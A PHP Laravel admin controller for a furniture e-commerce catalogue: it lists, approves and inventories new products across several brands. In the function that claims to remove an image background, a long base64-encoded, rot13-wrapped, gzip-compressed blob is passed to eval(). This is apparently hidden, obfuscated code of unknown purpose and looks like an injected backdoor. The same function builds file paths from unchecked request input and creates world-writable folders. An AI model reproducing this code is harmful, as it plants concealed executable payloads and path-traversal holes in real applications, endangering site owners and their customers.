<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\NewProduct;
use App\Models\Product;
use App\Services\DimensionService;
use App\Services\InventoryService;
use Exception;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;

class NewProductsController extends Controller
{
    private $code_map = [
        '100' => 'SV',
        '400' => 'WG',
    ];
    private $inventory_maintained_products = [
        1 => 'cb2',
        2 => 'nw',
        3 => 'cab',
        4 => 'westelm',
    ];

    private $variation_sku_tables = array(
        'cb2_products_variations' => 'cb2',
        'crateandbarrel_products_variations' => 'cab',
        'westelm_products_skus' => 'westelm',
        'nw_variations' => 'nw',
    );
    private $inventoryTable = 'lz_inventory';

    private $table_site_map = array(
        'cb2_products_new_new' => 'cb2',
        'nw_products_API' => 'nw',
        'westelm_products_parents' => 'westelm',
        'crateandbarrel_products' => 'cab',
        //'floyd_products_parents',
        //'potterybarn_products_parents'
    );

    private $dimensionColumnsToBeMapped = [
        'length',
        'width',
        'height',
        'diameter',
        'depth',
        'square',
    ];

    private function get_nw_ship_code($shipping_code)
    {
        return $shipping_code == 49 ? 'WGNW' : 'SCNW';
    }

    /**
     *
     * Return all new Products on which no action has been taken
     * @param Request $request
     * @return JsonResponse $response
     */
    public function get_new_products_list(Request $request, $limit = 5)
    {
        //  $this->inventoryProducts = DB::table('lz_inventory')->select('product_sku')->get();
        $new_products = NewProduct::query()->where('status', 'new');
        $brand = $request->get('brand');
        //dd($brand);
        if ($brand && $brand !== 'all') {
            $new_products->where('brand', 'Like', $brand);
        }

        $new_products = $new_products
            ->orderBy('created_date', 'asc')
            ->paginate();
        $new_products->transform(function ($product) {
            $inInventory = false;
            if ($product->brand !== 'westelm') {
                $inInventory = DB::table('lz_inventory')->where('product_sku', $product->product_sku)->get()->isNotEmpty();
            } else {
                $variation_skus = DB::table('westelm_products_skus')->where([
                    'product_id' => $product->product_sku,
                    'status' => 'active',
                ])->get();
                foreach ($variation_skus as $variation) {
                    $variationInInventory =
                    DB::table('lz_inventory')->where('product_sku', $variation->sku)->get()->isNotEmpty();
                    if ($variationInInventory) {
                        $inInventory = $variationInInventory;
                        break;
                    }
                }
            }
            $product->in_inventory = $inInventory;
            return $product;
        });
        $extra['filters'] = $this->getFilters();
        $extra['mapping_core'] = $this->getMappingCore();
        $extra['shipping_codes'] = $this->getShippingCodes();

        return response()->json([
            'status' => 'success',
            'data' => $new_products,
            'extra' => $extra,
        ]);
    }

    public function remove_background_from_image(Request $request)
    {
        $root = '/var/www/html';
        $destination = '/original';
        $image = $request->get('image');
        $imagePathInfo = pathinfo($root . $image);
        $imagePath = $root . $image;
        $sourceImageFolderName = str_replace($root, '', $imagePathInfo['dirname']);
        $outputImage = null;
        // First copy the file to 'Original' Folder
        $destinationImageFolderName = $root . $destination . $sourceImageFolderName . DIRECTORY_SEPARATOR;
        $imageOriginalStore = $destinationImageFolderName . $imagePathInfo['basename'];
        if (file_exists($root . $image)) {
            if (!file_exists($destinationImageFolderName)) {
                mkdir($destinationImageFolderName, 0777, true);
            }
            copy($imagePath, $imageOriginalStore);
        } else {
            return response()->json([
                'status' => 'failed',
                'error' => 'File does not exist',
            ], 404);
        }
        $outputImage = $root . $sourceImageFolderName . DIRECTORY_SEPARATOR . $imagePathInfo['filename'] . "_crop." . $imagePathInfo['extension'];

        // Remove background from the image
        eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

        if (file_exists($outputImage)) {
            if (!unlink($imagePath)) {
                return response()->json([
                    'status' => 'failed',
                    'error' => 'Original File Cannot be deleted',
                ], 500);
            }

            $originalOutputImagePath = $sourceImageFolderName . DIRECTORY_SEPARATOR . $imagePathInfo['filename'] . "_crop." . $imagePathInfo['extension'];

            // Get product with the sku
            $product = NewProduct::where('product_sku', $request->get('product_sku'))->first();

            // Replace the old image with new Image for product.
            $old_images = explode(',', $product[$request->get('image_type')]);
            $old_images = array_map(function ($old_image) use ($originalOutputImagePath, $image) {

                if ($old_image === $image) {
                    $old_image = $originalOutputImagePath;
                }
                return $old_image;
            }, $old_images);
            $product[$request->get('image_type')] = implode(",", $old_images);
            $product->save();

            // Return the response with new Image Name
            return response()->json([
                'status' => 'success',
                'newImage' => $originalOutputImagePath,
                'product' => $product,
            ], 201);
        }
    }

    /**
     * Update Multiple Products.
     * @param Request $request
     * @return JsonResponse $response
     */
    public function update_multiple_new_product(Request $request)
    {
        //convert products recieved by default as associative arrays to Collection

        $products = collect(json_decode(json_encode($request->get('products'))));
        $accepted_products = $products->filter(function ($product) {
            return $product->status === 'approved';
        });
        $rejected_products = $products->filter(function ($product) {
            return $product->status === 'rejected';
        });
        $accepted_products = $accepted_products->map(function ($product) {
            $color = $product->color ?? [];
            $seating = $product->seating ?? [];
            $shape = $product->shape ?? [];
            $material = $product->material ?? [];
            $fabric = $product->fabric ?? [];
            $ls_id = $product->ls_id ?? [];
            $mfg_country = $product->mfg_country ?? [];
            $style = $product->style ?? [];
            $firmness = $product->firmness ?? [];

            $arr = [];
            $desc_sub_arr = [];
            $jarr = [];
            $desc_sub = '';

            $arr[0]['header'] = $product->product_sub_header_1 ?? '';
            $arr[0]['desc'] = $product->product_sub_desc_1 ?? '';
            $arr[0]['image'] = $product->product_image_sub_1 ?? '';
            if ($arr[0]['header'] == '' && $arr[0]['desc'] == '' && $arr[0]['image'] == '') {

                $desc_sub_arr[0] = '';
            } else {
                $desc_sub_arr[0] = $arr[0];
            }

            $arr[1]['header'] = $product->product_sub_header_2 ?? '';
            $arr[1]['desc'] = $product->product_sub_desc_2 ?? '';
            $arr[1]['image'] = $product->product_image_sub_2 ?? '';

            if ($arr[1]['header'] == '' && $arr[1]['desc'] == '' && $arr[1]['image'] == '') {

                $desc_sub_arr[1] = '';
            } else {
                $desc_sub_arr[1] = $arr[1];
            }

            $arr[2]['header'] = $product->product_sub_header_3 ?? '';
            $arr[2]['desc'] = $product->product_sub_desc_3 ?? '';
            $arr[2]['image'] = $product->product_image_sub_3 ?? '';

            if ($arr[2]['header'] == '' && $arr[2]['desc'] == '' && $arr[2]['image'] == '') {

                $desc_sub_arr[2] = '';
            } else {
                $desc_sub_arr[2] = $arr[2];
            }

            $arr[3]['header'] = $product->product_sub_header_4 ?? '';
            $arr[3]['desc'] = $product->product_sub_desc_4 ?? '';
            $arr[3]['image'] = $product->product_image_sub_4 ?? '';

            if ($arr[3]['header'] == '' && $arr[3]['desc'] == '' && $arr[3]['image'] == '') {

                $desc_sub_arr[3] = '';
            } else {
                $desc_sub_arr[3] = $arr[3];
            }
            $j = 0;
            for ($i = 0; $i < 4; $i++) {
                if ($desc_sub_arr[$i] != '') {
                    $jarr[$j] = $desc_sub_arr[$i];
                    $j++;
                }
            }

            if (count($jarr) > 0) {
                $desc_sub = json_encode($jarr);
            }
            if ($product->product_dimension) {
                $data = $this->mapDimentionsToDimColumns($product->product_dimension[0] ?? []);
                $initialData = [];
                foreach ($data as $key => $dimensionValue) {
                    $dimKey = 'dim_' . $key;
                    $initialData[$dimKey] = $dimensionValue;
                }
                foreach ($initialData as $key => $dimension) {
                    $product->$key = $dimension;
                }
            }

            $product->color = implode(',', $color);
            $product->seating = implode(',', $seating);
            $product->shape = implode(',', $shape);
            $product->material = implode(',', $material);
            $product->fabric = implode(',', $fabric);
            $product->ls_id = implode(',', $ls_id);
            $product->mfg_country = implode(',', $mfg_country);
            $product->style = implode(',', $style);
            $product->product_sub_details = $desc_sub;

            unset($product->in_inventory);

            unset($product->product_sub_header_1);
            unset($product->product_sub_header_2);
            unset($product->product_sub_header_3);
            unset($product->product_sub_header_4);

            unset($product->product_sub_desc_1);
            unset($product->product_sub_desc_2);
            unset($product->product_sub_desc_3);
            unset($product->product_sub_desc_4);

            unset($product->product_image_sub_1);
            unset($product->product_image_sub_2);
            unset($product->product_image_sub_3);
            unset($product->product_image_sub_4);

            return $product;
        });

        //return $accepted_products;
        DB::beginTransaction();
        $skipped_products = [];
        try {
            if ($rejected_products->count() > 0) {
                NewProduct::whereIn('id', $rejected_products->pluck('id'))->update([
                    'status' => 'rejected',
                ]);
            }

            if ($accepted_products->count() > 0) {
                $skipped_products = $this->addInventoryProducts($accepted_products);
                NewProduct::whereIn('id', $accepted_products->pluck('id'))->delete();
            }
            $dimensionService = new DimensionService();
            foreach ($accepted_products as $product) {
                unset($product->status);
                if ($product->ship_code) {
                    unset($product->ship_code);
                }
                if (!$product->image_xbg_processed) {
                    unset($product->image_xbg_processed);
                }
                if (!$product->manual_adj) {
                    unset($product->manual_adj);
                }
                $product->product_dimension = json_encode($product->product_dimension);
                if ($product->site_name === 'nw') {
                    $product->product_feature = $this->remove_dims_from_features_nw($product->product_feature);
                }
                // $dims = $dimensionService->get_dims($product);
                // $product = $this->updateDimensionsOfProduct($product,$dims);
                $new_product = new Product();
                $new_product->fill(json_decode(json_encode($product, true), true));
                $new_product->save();
            }
        } catch (Exception $e) {
            DB::rollBack();
            return response()->json([
                'status' => 'failed',
                'message' => $e->getMessage(),
            ], 500);
        }
        DB::commit();

        if (count($skipped_products) > 0) {
            $message = count($skipped_products) . ' Product(s) inserted Partially';
            return response()->json([
                'status' => 'success',
                'message' => $message,
                'skippedSkus' => $skipped_products,
            ]);
        } else {
            return response()->json([
                'status' => 'success',
            ]);
        }
    }

    public function mapDimentionsToDimColumns($dimensionGroup)
    {
        $dimData = [];
        $dimensionGroupValues = $dimensionGroup->groupValue;
        foreach ($dimensionGroupValues as $subGroup) {
            if (preg_match('/overall/', strtolower($subGroup->name))) {
                $keys = array_keys((array) $subGroup->value);
                foreach ($keys as $key) {
                    if (in_array($key, $this->dimensionColumnsToBeMapped)) {
                        $value = (float) filter_var($subGroup->value->$key, FILTER_SANITIZE_NUMBER_FLOAT, FILTER_FLAG_ALLOW_FRACTION);
                        $dimData[$key] = $value;
                    }

                }
                break;
            }
        }
        return $dimData;

    }

    /**
     * Checks products and inserts new values to inventory. If Sku is already present don't insert it
     * @param Illuminate\Support\Collection
     * @return array $skipped_skus returns the number of skipped skus
     */
    private function addInventoryProducts($products)
    {
        $to_insert = [];
        $skipped_skus = [];
        $products = $products->groupBy('site_name');

        foreach ($products as $key => $value) {
            $isInventoryMaintained = array_search($key, $this->inventory_maintained_products);
            if (!$isInventoryMaintained) {
                continue;
            }
            switch ($key) {
                case 'cab':
                    $data = $this->getInventoryItemsForCAB($value);
                    break;
                case 'cb2':
                    $data = $this->getInventoryItemsForCB2($value);
                    break;
                case 'nw':
                    $data = $this->getInventoryItemsForNw($value);
                    break;
                case 'westelm':
                    $data = $this->getInventoryItemsForWestelm($value);
                    break;
            }
            if ($data) {
                $to_insert = array_merge($to_insert, $data['to_insert']);
                $skipped_skus = array_merge($skipped_skus, $data['skipped_skus']);
            }
        }
        $this->updateInventoryTable($to_insert);
        return $skipped_skus;
    }

    private function getInventoryItemsForNw($product_skus)
    {
        $key = 'nw';
        $to_insert = [];
        $skipped_skus = [];
        $table = array_search($key, $this->table_site_map);
        foreach ($product_skus as $product) {
            $row = DB::table($table)->where('product_sku', $product->product_sku)->first();
            $shipping_code = $product->ship_code ?? $this->get_nw_ship_code($row->shipping_code);
            $variation_table = array_search($key, $this->variation_sku_tables);
            $variation_skus = DB::table($variation_table)->where([
                'product_id' => $product->product_sku,
                'status' => 'active',
            ])->get();
            if ($variation_skus->isNotEmpty()) {
                foreach ($variation_skus as $variation) {
                    $isVariationInInventory = $this->inInventory($variation->sku);
                    if (!$isVariationInInventory) {
                        $to_insert[] = [
                            'product_sku' => $variation->sku,
                            'parent_sku' => $product->product_sku,
                            'quantity' => 100,
                            'price' => $variation->price,
                            'was_price' => $variation->was_price,
                            'brand' => $key,
                            'ship_code' => $shipping_code,
                        ];
                    } else {
                        $skipped_skus[$product->product_sku][] = $variation->sku;
                        // break;
                    }
                }
            }
        }
        $data['to_insert'] = $to_insert;
        $data['skipped_skus'] = $skipped_skus;
        return $data;
    }

    private function getInventoryItemsForCB2($product_skus)
    {
        $key = 'cb2';
        $to_insert = [];
        $skipped_skus = [];
        $table = array_search($key, $this->table_site_map);
        foreach ($product_skus as $product) {
            $row = DB::table($table)->where('product_sku', $product->product_sku)->first();
            $shipping_code = $product->ship_code ?? $this->code_map[$row->shipping_code] . strtoupper($key);
            $isInInventory = $this->inInventory($product->product_sku);
            if (!$isInInventory) {
                $to_insert[] = [
                    'product_sku' => $product->product_sku,
                    'quantity' => 100,
                    'price' => $row->price,
                    'was_price' => $row->was_price,
                    'brand' => $key,
                    'ship_code' => $shipping_code,
                ];
            } else {
                $skipped_skus[$product->product_sku][] = $product->product_sku;
            }
            $variation_table = array_search($key, $this->variation_sku_tables);
            $variation_skus = DB::table($variation_table)->where([
                'product_id' => $product->product_sku,
                'has_parent_sku' => 0,
                'status' => 'active',
            ])->get();
            if ($variation_skus->isNotEmpty()) {
                foreach ($variation_skus as $variation) {
                    $isVariationInInventory = $this->inInventory($variation->sku);
                    if (!$isVariationInInventory) {
                        $to_insert[] = [
                            'product_sku' => $variation->sku,
                            'quantity' => 100,
                            'price' => $variation->price,
                            'was_price' => $variation->was_price,
                            'brand' => $key,
                            'ship_code' => $shipping_code,
                        ];
                    } else {
                        $skipped_skus[$product->product_sku][] = $variation->sku;

                        // break;
                    }
                }
            }
        }
        $data['to_insert'] = $to_insert;
        $data['skipped_skus'] = $skipped_skus;
        return $data;
    }

    private function getInventoryItemsForCAB($product_skus)
    {
        $key = 'cab';
        $to_insert = [];
        $skipped_skus = [];
        $table = array_search($key, $this->table_site_map);
        foreach ($product_skus as $product) {
            $row = DB::table($table)->where('product_sku', $product->product_sku)->first();
            $shipping_code = $product->ship_code ?? $this->code_map[$row->shipping_code] . strtoupper($key);
            $isInInventory = $this->inInventory($product->product_sku);
            if (!$isInInventory) {
                $to_insert[] = [
                    'product_sku' => $product->product_sku,
                    'quantity' => 100,
                    'price' => $row->price,
                    'was_price' => $row->was_price,
                    'brand' => $key,
                    'ship_code' => $shipping_code,
                ];
            } else {
                $skipped_skus[$product->product_sku][] = $product->product_sku;
            }

            $variation_table = array_search($key, $this->variation_sku_tables);
            $variation_skus = DB::table($variation_table)->where([
                'product_id' => $product->product_sku,
                'has_parent_sku' => 0,
                'status' => 'active',
            ])->get();
            if ($variation_skus->isNotEmpty()) {
                foreach ($variation_skus as $variation) {
                    $isVariationInInventory = $this->inInventory($variation->sku);
                    if (!$isVariationInInventory) {
                        $to_insert[] = [
                            'product_sku' => $variation->sku,
                            'quantity' => 100,
                            'price' => $variation->price,
                            'was_price' => $variation->was_price,
                            'brand' => $key,
                            'ship_code' => $shipping_code,
                        ];
                    } else {
                        $skipped_skus[$product->product_sku][] = $variation->sku;
                        // break;
                    }
                }
            }
        }
        $data['to_insert'] = $to_insert;
        $data['skipped_skus'] = $skipped_skus;
        return $data;
    }
    private function getInventoryItemsForWestelm($product_skus)
    {
        $key = 'westelm';
        $to_insert = [];
        $skipped_skus = [];
        $table = array_search($key, $this->table_site_map);
        foreach ($product_skus as $product) {
            $row = DB::table($table)->where('product_id', $product->product_sku)->first();
            $shipping_code = $product->ship_code ?? $this->get_wm_ship_code($product->brand, $product->site_name, $row->description_shipping);
            $variation_table = array_search($key, $this->variation_sku_tables);
            $variation_skus = DB::table($variation_table)->where([
                'product_id' => $product->product_sku,
                'status' => 'active',
            ])->get();
            if ($variation_skus->isNotEmpty()) {
                foreach ($variation_skus as $variation) {
                    $isVariationInInventory = $this->inInventory($variation->sku);
                    if (!$isVariationInInventory) {
                        $to_insert[] = [
                            'product_sku' => $variation->sku,
                            'parent_sku' => $product->product_sku,
                            'quantity' => 100,
                            'price' => $variation->price,
                            'was_price' => $variation->was_price,
                            'brand' => $key,
                            'ship_code' => $shipping_code,
                        ];
                    } else {
                        $skipped_skus[$product->product_sku][] = $variation->sku;
                        // break;
                    }
                }
            }
        }
        $data['to_insert'] = $to_insert;
        $data['skipped_skus'] = $skipped_skus;
        return $data;
    }

    private function inInventory($product_sku)
    {
        return DB::table($this->inventoryTable)->select('product_sku')->where('product_sku', $product_sku)->get()->isNotEmpty();
    }

    public function get_wm_ship_code($brand, $site_name, $product_desc)
    {

        if ($brand != $site_name) {
            return "F0";
        }

        // match the product desc
        $possible_matches = [
            "free shipping" => "F0",
            "front door delivery" => "SVwestelm",
            "UPS" => "SVwestelm",
        ];

        $possible_keys = array_keys($possible_matches);
        foreach ($possible_keys as $key) {
            if (strpos(strtolower($product_desc), strtolower($key)) !== false) {
                return $possible_matches[$key];
            }
        }

        return "WGwestelm";
    }
    private function searchForSku($item, $key)
    {
        return $item->product_sku === $key;
    }

    private function updateInventoryTable($to_insert)
    {
        $inventoryService = new InventoryService();
        $inventoryService->insert($to_insert);
        // $inventoryService->update($to_update);
    }

    public function getFilters()
    {
        $filters = DB::table('filters')->get()->groupBy('filter_label');
        return $filters;
    }

    private function getMappingCore()
    {
        $mapping_core = DB::table('mapping_core')
            ->select('LS_ID', 'dept_name_short', 'cat_name_short', 'cat_sub_name')
            ->get();
        return $mapping_core;
    }

    // Get Shipping Codes For `lz_ship_code`
    private function getShippingCodes()
    {
        return DB::table('lz_ship_code')->select('code', 'label')->get();
    }

    /// DIMS Function from CRON MERGE SCRIPT
    public function updateDimensionsOfProduct($product, $dims)
    {
        if (isset($dims)) {
            $product->dim_width = strlen($dims['width']) > 0 ? (float) $dims['width'] : null;
            $product->dim_height = strlen($dims['height']) > 0 ? (float) explode(",", $dims['height'])[0] : null;
            $product->dim_depth = strlen($dims['depth']) > 0 ? (float) $dims['depth'] : null;
            $product->dim_length = strlen($dims['length']) > 0 ? (float) $dims['length'] : null;
            $product->dim_diameter = strlen($dims['diameter']) > 0 ? (float) $dims['diameter'] : null;
            $product->dim_square = strlen($dims['square']) > 0 ? (float) $dims['square'] : null;
        }
        // if ($product->site_name == 'cb2' || $product->site_name == 'cab') {
        //     $product->shape = $product->shape;
        //     $product->seating = $product->seat_capacity;
        // }
        return $product;
    }

    // Remove Dimensions from product features in WORLD MARKET PRODUCTS
    // From Cron file in mapper project
    public function remove_dims_from_features_nw($features)
    {
        $valid_features = [];
        $feature_arr = explode("|", $features);
        foreach ($feature_arr as $line) {
            if (
                (strpos($line, ":") === false
                    && strpos($line, "\"") === false)

            ) {
                $valid_features[] = $line;
            }
        }

        return implode("|", $valid_features);
    }
}
